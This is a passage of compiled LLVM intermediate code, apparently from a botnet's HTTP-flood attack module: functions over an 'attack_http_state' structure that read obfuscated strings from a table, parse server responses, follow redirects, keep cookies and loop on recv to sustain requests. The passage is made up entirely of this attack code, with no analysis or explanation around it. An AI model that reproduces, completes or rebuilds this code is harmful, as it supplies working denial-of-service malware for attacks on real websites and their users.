  %474 = call i32 @util_strlen(i8* %464)
  %475 = call i8* @table_retrieve_val(i32 50, i32* null)
  %476 = call i32 @util_stristr(i8* %464, i32 %474, i8* %475)
  %477 = icmp eq i32 %476, 0
  br i1 %477, label %479, label %478

; <label>:478:                                    ; preds = %468
  store i32 1, i32* %451, align 4
  br label %479

; <label>:479:                                    ; preds = %468, %455, %450, %478
  %480 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 13
  store i32 0, i32* %480, align 4
  %481 = call i8* @table_retrieve_val(i32 48, i32* null)
  %482 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %481)
  %483 = icmp eq i32 %482, -1
  br i1 %483, label %508, label %484

; <label>:484:                                    ; preds = %479
  %485 = call i8* @table_retrieve_val(i32 48, i32* null)
  %486 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %485)
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %487
  %489 = load i8, i8* %488, align 1
  %490 = icmp eq i8 %489, 32
  %491 = zext i1 %490 to i32
  %.557 = add nsw i32 %491, %486
  %492 = sext i32 %.557 to i64
  %493 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %492
  %494 = sub nsw i32 %427, %.557
  %495 = call i32 @util_memsearch(i8* %493, i32 %494, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %496 = icmp eq i32 %495, -1
  br i1 %496, label %508, label %497

; <label>:497:                                    ; preds = %484
  %498 = icmp sgt i32 %495, 1
  %499 = add nsw i32 %495, -2
  %.558 = select i1 %498, i32 %499, i32 %495
  %500 = add nsw i32 %.557, %.558
  %501 = sext i32 %500 to i64
  %502 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %501
  store i8 0, i8* %502, align 1
  %503 = call i32 @util_strlen(i8* %493)
  %504 = call i8* @table_retrieve_val(i32 49, i32* null)
  %505 = call i32 @util_stristr(i8* %493, i32 %503, i8* %504)
  %506 = icmp eq i32 %505, 0
  br i1 %506, label %508, label %507

; <label>:507:                                    ; preds = %497
  store i32 1, i32* %480, align 4
  br label %508

; <label>:508:                                    ; preds = %497, %484, %479, %507
  %509 = call i8* @table_retrieve_val(i32 47, i32* null)
  %510 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %509)
  %511 = icmp eq i32 %510, -1
  br i1 %511, label %.sink.split, label %512

; <label>:512:                                    ; preds = %508
  %513 = call i8* @table_retrieve_val(i32 47, i32* null)
  %514 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %513)
  %515 = sext i32 %514 to i64
  %516 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %515
  %517 = load i8, i8* %516, align 1
  %518 = icmp eq i8 %517, 32
  %519 = zext i1 %518 to i32
  %.559 = add nsw i32 %519, %514
  %520 = sext i32 %.559 to i64
  %521 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %520
  %522 = sub nsw i32 %427, %.559
  %523 = call i32 @util_memsearch(i8* %521, i32 %522, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %524 = icmp eq i32 %523, -1
  br i1 %524, label %.preheader595, label %525

; <label>:525:                                    ; preds = %512
  %526 = icmp sgt i32 %523, 1
  %527 = add nsw i32 %523, -2
  %.560 = select i1 %526, i32 %527, i32 %523
  %528 = add nsw i32 %.559, %.560
  %529 = sext i32 %528 to i64
  %530 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %529
  store i8 0, i8* %530, align 1
  %531 = call i32 @util_atoi(i8* %521, i32 10)
  br label %.sink.split

.sink.split:                                      ; preds = %508, %525
  %.sink6 = phi i32 [ %531, %525 ], [ 0, %508 ]
  %532 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 14
  store i32 %.sink6, i32* %532, align 4
  br label %.preheader595

.preheader595:                                    ; preds = %512, %.sink.split
  %533 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 15
  %534 = call i8* @table_retrieve_val(i32 46, i32* null)
  %535 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %534)
  %536 = icmp eq i32 %535, -1
  br i1 %536, label %.critedge561, label %.lr.ph636.preheader

.lr.ph636.preheader:                              ; preds = %.preheader595
  br label %.lr.ph636

.lr.ph636:                                        ; preds = %.lr.ph636.preheader, %.loopexit
  %537 = phi i8* [ %.pre687, %.loopexit ], [ %21, %.lr.ph636.preheader ]
  %.0539635 = phi i32 [ %.pre684, %.loopexit ], [ 0, %.lr.ph636.preheader ]
  %538 = load i32, i32* %533, align 4
  %539 = icmp slt i32 %538, 5
  br i1 %539, label %540, label %.critedge561.loopexit

; <label>:540:                                    ; preds = %.lr.ph636
  %541 = call i8* @table_retrieve_val(i32 46, i32* null)
  %542 = call i32 @util_stristr(i8* %537, i32 %427, i8* %541)
  %543 = add nsw i32 %542, %.0539635
  %544 = sext i32 %543 to i64
  %545 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %544
  %546 = load i8, i8* %545, align 1
  %547 = icmp eq i8 %546, 32
  %548 = zext i1 %547 to i32
  %.562 = add nsw i32 %548, %542
  %549 = sext i32 %.562 to i64
  %550 = getelementptr inbounds i8, i8* %537, i64 %549
  %551 = sub nsw i32 %427, %.0539635
  %552 = sub i32 %551, %.562
  %553 = call i32 @util_memsearch(i8* %550, i32 %552, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %554 = icmp eq i32 %553, -1
  %.pre684 = add nsw i32 %.562, %.0539635
  %.pre685 = sext i32 %.pre684 to i64
  %.pre687 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %.pre685
  br i1 %554, label %.loopexit, label %555

; <label>:555:                                    ; preds = %540
  %556 = icmp sgt i32 %553, 1
  %557 = add nsw i32 %553, -2
  %.563 = select i1 %556, i32 %557, i32 %553
  %558 = call i32 @util_memsearch(i8* %550, i32 %552, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 1)
  %559 = icmp sgt i32 %558, 0
  %560 = add nsw i32 %558, -1
  %..563 = select i1 %559, i32 %560, i32 %.563
  %561 = add nsw i32 %..563, %.pre684
  %562 = sext i32 %561 to i64
  %563 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %562
  store i8 0, i8* %563, align 1
  store i32 0, i32* %5, align 4
  %564 = call i32 @util_strlen(i8* nonnull %.pre687)
  %565 = icmp sgt i32 %564, 0
  br i1 %565, label %.lr.ph629.preheader, label %._crit_edge630

.lr.ph629.preheader:                              ; preds = %555
  br label %.lr.ph629

; <label>:566:                                    ; preds = %.lr.ph629
  %567 = trunc i64 %indvars.iv.next667 to i32
  store i32 %567, i32* %5, align 4
  %568 = call i32 @util_strlen(i8* nonnull %.pre687)
  %569 = sext i32 %568 to i64
  %570 = icmp slt i64 %indvars.iv.next667, %569
  br i1 %570, label %.lr.ph629, label %._crit_edge630.loopexit

.lr.ph629:                                        ; preds = %.lr.ph629.preheader, %566
  %571 = phi i32 [ %567, %566 ], [ 0, %.lr.ph629.preheader ]
  %indvars.iv666 = phi i64 [ %indvars.iv.next667, %566 ], [ 0, %.lr.ph629.preheader ]
  %572 = getelementptr inbounds i8, i8* %.pre687, i64 %indvars.iv666
  %573 = load i8, i8* %572, align 1
  %574 = icmp eq i8 %573, 61
  %indvars.iv.next667 = add nuw i64 %indvars.iv666, 1
  br i1 %574, label %._crit_edge630.loopexit, label %566

._crit_edge630.loopexit:                          ; preds = %.lr.ph629, %566
  %.ph = phi i32 [ %567, %566 ], [ %571, %.lr.ph629 ]
  br label %._crit_edge630

._crit_edge630:                                   ; preds = %._crit_edge630.loopexit, %555
  %575 = phi i32 [ 0, %555 ], [ %.ph, %._crit_edge630.loopexit ]
  %576 = sext i32 %575 to i64
  %577 = getelementptr inbounds i8, i8* %.pre687, i64 %576
  %578 = load i8, i8* %577, align 1
  %579 = icmp eq i8 %578, 61
  br i1 %579, label %.preheader, label %.loopexit

.preheader:                                       ; preds = %._crit_edge630
  store i32 0, i32* %5, align 4
  %580 = load i32, i32* %533, align 4
  %581 = icmp sgt i32 %580, 0
  br i1 %581, label %.lr.ph633.preheader, label %.critedge564

.lr.ph633.preheader:                              ; preds = %.preheader
  %582 = sext i32 %580 to i64
  br label %.lr.ph633

; <label>:583:                                    ; preds = %.lr.ph633
  %584 = trunc i64 %indvars.iv.next669 to i32
  store i32 %584, i32* %5, align 4
  %585 = icmp slt i64 %indvars.iv.next669, %582
  br i1 %585, label %.lr.ph633, label %.critedge564.loopexit

.lr.ph633:                                        ; preds = %.lr.ph633.preheader, %583
  %indvars.iv668 = phi i64 [ %indvars.iv.next669, %583 ], [ 0, %.lr.ph633.preheader ]
  %586 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 16, i64 %indvars.iv668, i64 0
  %587 = call signext i8 @util_strncmp(i8* %.pre687, i8* %586, i32 %575)
  %588 = icmp eq i8 %587, 0
  %indvars.iv.next669 = add nuw i64 %indvars.iv668, 1
  br i1 %588, label %583, label %.loopexit.loopexit

.critedge564.loopexit:                            ; preds = %583
  br label %.critedge564

.critedge564:                                     ; preds = %.critedge564.loopexit, %.preheader
  %589 = call i32 @util_strlen(i8* %.pre687)
  %590 = icmp slt i32 %589, 128
  br i1 %590, label %591, label %.loopexit

; <label>:591:                                    ; preds = %.critedge564
  %592 = sext i32 %580 to i64
  %593 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 16, i64 %592, i64 0
  %594 = call i32 @util_strcpy(i8* %593, i8* %.pre687)
  %595 = load i32, i32* %533, align 4
  %596 = add nsw i32 %595, 1
  store i32 %596, i32* %533, align 4
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %.lr.ph633
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %540, %._crit_edge630, %.critedge564, %591
  %597 = call i8* @table_retrieve_val(i32 46, i32* null)
  %598 = call i32 @util_stristr(i8* %.pre687, i32 %427, i8* %597)
  %599 = icmp eq i32 %598, -1
  br i1 %599, label %.critedge561.loopexit, label %.lr.ph636

.critedge561.loopexit:                            ; preds = %.loopexit, %.lr.ph636
  br label %.critedge561

.critedge561:                                     ; preds = %.critedge561.loopexit, %.preheader595
  %600 = call i8* @table_retrieve_val(i32 45, i32* null)
  %601 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %600)
  %602 = icmp eq i32 %601, -1
  br i1 %602, label %678, label %603

; <label>:603:                                    ; preds = %.critedge561
  %604 = call i8* @table_retrieve_val(i32 45, i32* null)
  %605 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %604)
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %606
  %608 = load i8, i8* %607, align 1
  %609 = icmp eq i8 %608, 32
  %610 = zext i1 %609 to i32
  %.565 = add nsw i32 %610, %605
  %611 = sext i32 %.565 to i64
  %612 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %611
  %613 = sub nsw i32 %427, %.565
  %614 = call i32 @util_memsearch(i8* %612, i32 %613, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %615 = icmp eq i32 %614, -1
  br i1 %615, label %678, label %616

; <label>:616:                                    ; preds = %603
  %617 = icmp sgt i32 %614, 1
  %618 = add nsw i32 %614, -2
  %.566 = select i1 %617, i32 %618, i32 %614
  %619 = add nsw i32 %.565, %.566
  %620 = sext i32 %619 to i64
  %621 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %620
  store i8 0, i8* %621, align 1
  %622 = add nsw i32 %.566, 1
  %623 = call i32 @util_memsearch(i8* %612, i32 %622, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0), i32 4)
  %624 = icmp eq i32 %623, 4
  br i1 %624, label %625, label %664

; <label>:625:                                    ; preds = %616
  %626 = getelementptr inbounds i8, i8* %612, i64 4
  %627 = load i8, i8* %626, align 1
  %628 = icmp eq i8 %627, 115
  %.567 = select i1 %628, i32 8, i32 7
  store i32 %.567, i32* %5, align 4
  %629 = zext i32 %.567 to i64
  %630 = getelementptr inbounds i8, i8* %612, i64 %629
  %631 = sub nsw i32 %622, %.567
  %632 = sext i32 %631 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %612, i8* %630, i64 %632, i32 1, i1 false)
  br label %633

; <label>:633:                                    ; preds = %638, %625
  %indvars.iv670 = phi i64 [ %indvars.iv.next671, %638 ], [ 0, %625 ]
  %634 = getelementptr inbounds i8, i8* %612, i64 %indvars.iv670
  %635 = load i8, i8* %634, align 1
  switch i8 %635, label %638 [
    i8 0, label %.loopexit594
    i8 47, label %636
  ]

; <label>:636:                                    ; preds = %633
  %637 = trunc i64 %indvars.iv670 to i32
  store i32 %637, i32* %5, align 4
  store i8 0, i8* %634, align 1
  br label %640

; <label>:638:                                    ; preds = %633
  %indvars.iv.next671 = add nuw i64 %indvars.iv670, 1
  br label %633

.loopexit594:                                     ; preds = %633
  %639 = trunc i64 %indvars.iv670 to i32
  store i32 %639, i32* %5, align 4
  br label %640

; <label>:640:                                    ; preds = %.loopexit594, %636
  %641 = phi i32 [ %639, %.loopexit594 ], [ %637, %636 ]
  %642 = call i32 @util_strlen(i8* nonnull %612)
  %.off589 = add i32 %642, -1
  %643 = icmp ult i32 %.off589, 127
  br i1 %643, label %644, label %647

; <label>:644:                                    ; preds = %640
  %645 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 7, i64 0
  %646 = call i32 @util_strcpy(i8* %645, i8* nonnull %612)
  %.pre681 = load i32, i32* %5, align 4
  br label %647

; <label>:647:                                    ; preds = %644, %640
  %648 = phi i32 [ %.pre681, %644 ], [ %641, %640 ]
  %649 = add nsw i32 %648, 1
  %650 = sext i32 %649 to i64
  %651 = getelementptr inbounds i8, i8* %612, i64 %650
  %652 = call i32 @util_strlen(i8* %651)
  %653 = icmp slt i32 %652, 256
  br i1 %653, label %654, label %677

; <label>:654:                                    ; preds = %647
  %655 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 6, i64 1
  call void @util_zero(i8* %655, i32 255)
  %656 = load i32, i32* %5, align 4
  %657 = add nsw i32 %656, 1
  %658 = sext i32 %657 to i64
  %659 = getelementptr inbounds i8, i8* %612, i64 %658
  %660 = call i32 @util_strlen(i8* %659)
  %661 = icmp sgt i32 %660, 0
  br i1 %661, label %662, label %677

; <label>:662:                                    ; preds = %654
  %663 = call i32 @util_strcpy(i8* %655, i8* %659)
  br label %677

; <label>:664:                                    ; preds = %616
  %665 = load i8, i8* %612, align 1
  %666 = icmp eq i8 %665, 47
  br i1 %666, label %667, label %677

; <label>:667:                                    ; preds = %664
  %668 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 6, i64 1
  call void @util_zero(i8* %668, i32 255)
  %669 = load i32, i32* %5, align 4
  %670 = add nsw i32 %669, 1
  %671 = sext i32 %670 to i64
  %672 = getelementptr inbounds i8, i8* %612, i64 %671
  %673 = call i32 @util_strlen(i8* %672)
  %.off588 = add i32 %673, -1
  %674 = icmp ult i32 %.off588, 255
  br i1 %674, label %675, label %677

; <label>:675:                                    ; preds = %667
  %676 = call i32 @util_strcpy(i8* %668, i8* %672)
  br label %677

; <label>:677:                                    ; preds = %664, %675, %667, %647, %662, %654
  store i8 1, i8* %414, align 4
  br label %.loopexit597

; <label>:678:                                    ; preds = %603, %.critedge561
  %679 = call i8* @table_retrieve_val(i32 44, i32* null)
  %680 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %679)
  %681 = icmp eq i32 %680, -1
  br i1 %681, label %820, label %682

; <label>:682:                                    ; preds = %678
  %683 = call i8* @table_retrieve_val(i32 44, i32* null)
  %684 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %683)
  %685 = sext i32 %684 to i64
  %686 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %685
  %687 = load i8, i8* %686, align 1
  %688 = icmp eq i8 %687, 32
  %689 = zext i1 %688 to i32
  %.568 = add nsw i32 %689, %684
  %690 = sext i32 %.568 to i64
  %691 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %690
  %692 = sub nsw i32 %427, %.568
  %693 = call i32 @util_memsearch(i8* %691, i32 %692, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %694 = icmp eq i32 %693, -1
  br i1 %694, label %820, label %695

; <label>:695:                                    ; preds = %682
  %696 = icmp sgt i32 %693, 1
  %697 = add nsw i32 %693, -2
  %.569 = select i1 %696, i32 %697, i32 %693
  %698 = add nsw i32 %.568, %.569
  %699 = sext i32 %698 to i64
  %700 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %699
  store i8 0, i8* %700, align 1
  br label %701

; <label>:701:                                    ; preds = %701, %695
  %indvars.iv672 = phi i64 [ %indvars.iv.next673, %701 ], [ 0, %695 ]
  %702 = getelementptr inbounds i8, i8* %691, i64 %indvars.iv672
  %703 = load i8, i8* %702, align 1
  %.off590 = add i8 %703, -48
  %704 = icmp ult i8 %.off590, 10
  %indvars.iv.next673 = add nuw i64 %indvars.iv672, 1
  br i1 %704, label %701, label %.critedge

.critedge:                                        ; preds = %701
  %705 = add nsw i32 %.569, 1
  %706 = trunc i64 %indvars.iv672 to i32
  store i32 %706, i32* %5, align 4
  %707 = icmp eq i8 %703, 0
  br i1 %707, label %820, label %708

; <label>:708:                                    ; preds = %.critedge
  store i8 0, i8* %702, align 1
  %709 = add nsw i32 %706, 1
  store i32 %709, i32* %5, align 4
  %710 = sext i32 %709 to i64
  %711 = getelementptr inbounds i8, i8* %691, i64 %710
  %712 = load i8, i8* %711, align 1
  %713 = icmp eq i8 %712, 32
  br i1 %713, label %714, label %716

; <label>:714:                                    ; preds = %708
  %715 = add nsw i32 %706, 2
  store i32 %715, i32* %5, align 4
  br label %716

; <label>:716:                                    ; preds = %714, %708
  %717 = phi i32 [ %715, %714 ], [ %709, %708 ]
  %718 = sext i32 %717 to i64
  %719 = getelementptr inbounds i8, i8* %691, i64 %718
  %720 = call i32 @util_strlen(i8* %719)
  %721 = call i32 @util_stristr(i8* %719, i32 %720, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0))
  %722 = icmp eq i32 %721, -1
  br i1 %722, label %725, label %723

; <label>:723:                                    ; preds = %716
  %724 = add nsw i32 %721, %717
  store i32 %724, i32* %5, align 4
  br label %725

; <label>:725:                                    ; preds = %716, %723
  %726 = phi i32 [ %717, %716 ], [ %724, %723 ]
  %727 = sext i32 %726 to i64
  %728 = getelementptr inbounds i8, i8* %691, i64 %727
  %729 = load i8, i8* %728, align 1
  %730 = icmp eq i8 %729, 34
  br i1 %730, label %731, label %742

; <label>:731:                                    ; preds = %725
  %732 = add nsw i32 %726, 1
  store i32 %732, i32* %5, align 4
  %733 = sext i32 %732 to i64
  %734 = getelementptr inbounds i8, i8* %691, i64 %733
  %735 = call i32 @util_strlen(i8* %734)
  %736 = add nsw i32 %735, -1
  %737 = sext i32 %736 to i64
  %738 = getelementptr inbounds i8, i8* %734, i64 %737
  %739 = load i8, i8* %738, align 1
  %740 = icmp eq i8 %739, 34
  br i1 %740, label %741, label %742

; <label>:741:                                    ; preds = %731
  store i8 0, i8* %738, align 1
  br label %742

; <label>:742:                                    ; preds = %731, %741, %725
  %743 = phi i32 [ %732, %731 ], [ %732, %741 ], [ %726, %725 ]
  %744 = call i32 @util_atoi(i8* nonnull %691, i32 10)
  %745 = add i32 %744, %376
  %746 = zext i32 %745 to i64
  %.off = add i32 %744, -1
  %747 = icmp ult i32 %.off, 9
  br i1 %747, label %.lr.ph640.split.us.preheader, label %.critedge12

.lr.ph640.split.us.preheader:                     ; preds = %742
  %748 = call i64 @time(i64* null) #10
  %749 = icmp sgt i64 %746, %748
  br i1 %749, label %.lr.ph640.split.us.preheader724, label %.critedge12.loopexit

.lr.ph640.split.us.preheader724:                  ; preds = %.lr.ph640.split.us.preheader
  br label %.lr.ph640.split.us

.lr.ph640.split.us:                               ; preds = %.lr.ph640.split.us.preheader724, %.lr.ph640.split.us
  %750 = call i32 @sleep(i32 1) #10
  %751 = call i64 @time(i64* null) #10
  %752 = icmp sgt i64 %746, %751
  br i1 %752, label %.lr.ph640.split.us, label %.critedge12.loopexit.loopexit

.critedge12.loopexit.loopexit:                    ; preds = %.lr.ph640.split.us
  br label %.critedge12.loopexit

.critedge12.loopexit:                             ; preds = %.critedge12.loopexit.loopexit, %.lr.ph640.split.us.preheader
  %.pre682 = load i32, i32* %5, align 4
  br label %.critedge12

.critedge12:                                      ; preds = %.critedge12.loopexit, %742
  %753 = phi i32 [ %.pre682, %.critedge12.loopexit ], [ %743, %742 ]
  %754 = sext i32 %753 to i64
  %755 = getelementptr inbounds i8, i8* %691, i64 %754
  %756 = call i32 @util_strlen(i8* %755)
  %757 = call i32 @util_stristr(i8* %755, i32 %756, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0))
  %758 = icmp eq i32 %757, 4
  br i1 %758, label %759, label %798

; <label>:759:                                    ; preds = %.critedge12
  %760 = getelementptr inbounds i8, i8* %755, i64 4
  %761 = load i8, i8* %760, align 1
  %762 = icmp eq i8 %761, 115
  %.572 = select i1 %762, i32 8, i32 7
  store i32 %.572, i32* %5, align 4
  %763 = zext i32 %.572 to i64
  %764 = getelementptr inbounds i8, i8* %755, i64 %763
  %765 = sub i32 %705, %.572
  %766 = sext i32 %765 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %755, i8* %764, i64 %766, i32 1, i1 false)
  br label %767

; <label>:767:                                    ; preds = %772, %759
  %indvars.iv674 = phi i64 [ %indvars.iv.next675, %772 ], [ 0, %759 ]
  %768 = getelementptr inbounds i8, i8* %755, i64 %indvars.iv674
  %769 = load i8, i8* %768, align 1
  switch i8 %769, label %772 [
    i8 0, label %.loopexit593
    i8 47, label %770
  ]

; <label>:770:                                    ; preds = %767
  %771 = trunc i64 %indvars.iv674 to i32
  store i32 %771, i32* %5, align 4
  store i8 0, i8* %768, align 1
  br label %774

; <label>:772:                                    ; preds = %767
  %indvars.iv.next675 = add nuw i64 %indvars.iv674, 1
  br label %767

.loopexit593:                                     ; preds = %767
  %773 = trunc i64 %indvars.iv674 to i32
  store i32 %773, i32* %5, align 4
  br label %774

; <label>:774:                                    ; preds = %.loopexit593, %770
  %775 = phi i32 [ %773, %.loopexit593 ], [ %771, %770 ]
  %776 = call i32 @util_strlen(i8* nonnull %755)
  %.off591 = add i32 %776, -1
  %777 = icmp ult i32 %.off591, 127
  br i1 %777, label %778, label %781

; <label>:778:                                    ; preds = %774
  %779 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 7, i64 0
  %780 = call i32 @util_strcpy(i8* %779, i8* nonnull %755)
  %.pre683 = load i32, i32* %5, align 4
  br label %781

; <label>:781:                                    ; preds = %778, %774
  %782 = phi i32 [ %.pre683, %778 ], [ %775, %774 ]
  %783 = add nsw i32 %782, 1
  %784 = sext i32 %783 to i64
  %785 = getelementptr inbounds i8, i8* %755, i64 %784
  %786 = call i32 @util_strlen(i8* %785)
  %787 = icmp slt i32 %786, 256
  br i1 %787, label %788, label %817

; <label>:788:                                    ; preds = %781
  %789 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 6, i64 1
  call void @util_zero(i8* %789, i32 255)
  %790 = load i32, i32* %5, align 4
  %791 = add nsw i32 %790, 1
  %792 = sext i32 %791 to i64
  %793 = getelementptr inbounds i8, i8* %755, i64 %792
  %794 = call i32 @util_strlen(i8* %793)
  %795 = icmp sgt i32 %794, 0
  br i1 %795, label %796, label %817

; <label>:796:                                    ; preds = %788
  %797 = call i32 @util_strcpy(i8* %789, i8* %793)
  br label %817

; <label>:798:                                    ; preds = %.critedge12
  %799 = load i8, i8* %755, align 1
  %800 = icmp eq i8 %799, 47
  br i1 %800, label %801, label %817

; <label>:801:                                    ; preds = %798
  %802 = add nsw i32 %753, 1
  %803 = sext i32 %802 to i64
  %804 = getelementptr inbounds i8, i8* %755, i64 %803
  %805 = call i32 @util_strlen(i8* %804)
  %806 = icmp slt i32 %805, 256
  br i1 %806, label %807, label %817

; <label>:807:                                    ; preds = %801
  %808 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 6, i64 1
  call void @util_zero(i8* %808, i32 255)
  %809 = load i32, i32* %5, align 4
  %810 = add nsw i32 %809, 1
  %811 = sext i32 %810 to i64
  %812 = getelementptr inbounds i8, i8* %755, i64 %811
  %813 = call i32 @util_strlen(i8* %812)
  %814 = icmp sgt i32 %813, 0
  br i1 %814, label %815, label %817

; <label>:815:                                    ; preds = %807
  %816 = call i32 @util_strcpy(i8* %808, i8* %812)
  br label %817

; <label>:817:                                    ; preds = %798, %807, %815, %801, %781, %796, %788
  %818 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 9, i64 0
  %819 = bitcast i8* %818 to i32*
  store i32 5522759, i32* %819, align 1
  store i8 10, i8* %414, align 4
  br label %.loopexit597

; <label>:820:                                    ; preds = %.critedge, %682, %678
  %821 = call i32 @util_memsearch(i8* nonnull %21, i32 %427, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 4)
  %822 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 9, i64 0
  %823 = call signext i8 @util_strcmp(i8* %822, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0))
  %824 = icmp eq i8 %823, 0
  br i1 %824, label %825, label %830

; <label>:825:                                    ; preds = %820
  %826 = call signext i8 @util_strcmp(i8* %822, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  %827 = icmp eq i8 %826, 0
  br i1 %827, label %828, label %830

; <label>:828:                                    ; preds = %825
  %829 = icmp sgt i32 %427, %821
  %.sink13 = select i1 %829, i8 10, i8 1
  br label %830

; <label>:830:                                    ; preds = %820, %825, %828
  %storemerge542 = phi i8 [ %.sink13, %828 ], [ 7, %825 ], [ 7, %820 ]
  store i8 %storemerge542, i8* %414, align 4
  %831 = load i32, i32* %378, align 4
  %832 = sext i32 %821 to i64
  %833 = call i64 @recv(i32 %831, i8* nonnull %21, i64 %832, i32 16384) #10
  br label %.loopexit597

; <label>:834:                                    ; preds = %.preheader596, %.backedge
  %835 = load i32, i32* %416, align 4
  %836 = icmp eq i32 %835, 1024
  br i1 %836, label %837, label %838

; <label>:837:                                    ; preds = %834
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %417, i8* nonnull %418, i64 960, i32 1, i1 false)
  store i32 960, i32* %416, align 4
  br label %838

; <label>:838:                                    ; preds = %837, %834
  %839 = tail call i32* @__errno_location() #11
  store i32 0, i32* %839, align 4
  %840 = load i32, i32* %378, align 4
  %841 = load i32, i32* %416, align 4
  %842 = sext i32 %841 to i64
  %843 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 18, i64 %842
  %844 = sub nsw i32 1024, %841
  %845 = sext i32 %844 to i64
  %846 = call i64 @recv(i32 %840, i8* %843, i64 %845, i32 16384) #10
  %847 = trunc i64 %846 to i32
  switch i32 %847, label %853 [
    i32 0, label %.thread581
    i32 -1, label %848
  ]

.thread581:                                       ; preds = %838
  store i32 104, i32* %839, align 4
  br label %850

; <label>:848:                                    ; preds = %838
  %.pr580 = load i32, i32* %839, align 4
  %849 = icmp eq i32 %.pr580, 11
  br i1 %849, label %.loopexit597, label %850

; <label>:850:                                    ; preds = %.thread581, %848
  %851 = load i32, i32* %378, align 4
  %852 = call i32 @close(i32 %851) #10
  store i32 -1, i32* %378, align 4
  store i8 0, i8* %414, align 4
  br label %.loopexit597

; <label>:853:                                    ; preds = %838
  %854 = load i32, i32* %416, align 4
  %855 = add nsw i32 %854, %847
  store i32 %855, i32* %416, align 4
  store i32 %376, i32* %419, align 4
  br label %856

; <label>:856:                                    ; preds = %952, %853
  %857 = phi i32 [ %959, %952 ], [ %855, %853 ]
  %858 = load i32, i32* %420, align 4
  %859 = icmp sgt i32 %858, 0
  br i1 %859, label %860, label %920

; <label>:860:                                    ; preds = %856
  %861 = icmp sgt i32 %858, %857
  %.sink14 = select i1 %861, i32* %416, i32* %420
  %862 = load i32, i32* %.sink14, align 4
  %863 = sub nsw i32 %858, %862
  store i32 %863, i32* %420, align 4
  %864 = load i32, i32* %421, align 4
  %865 = icmp eq i32 %864, 1
  br i1 %865, label %866, label %920

; <label>:866:                                    ; preds = %860
  %867 = call i8* @table_retrieve_val(i32 43, i32* null)
  %868 = call i32 @util_memsearch(i8* nonnull %417, i32 %857, i8* %867, i32 11)
  %869 = icmp eq i32 %868, -1
  br i1 %869, label %thread-pre-split573, label %870

; <label>:870:                                    ; preds = %866
  %871 = load i32, i32* %416, align 4
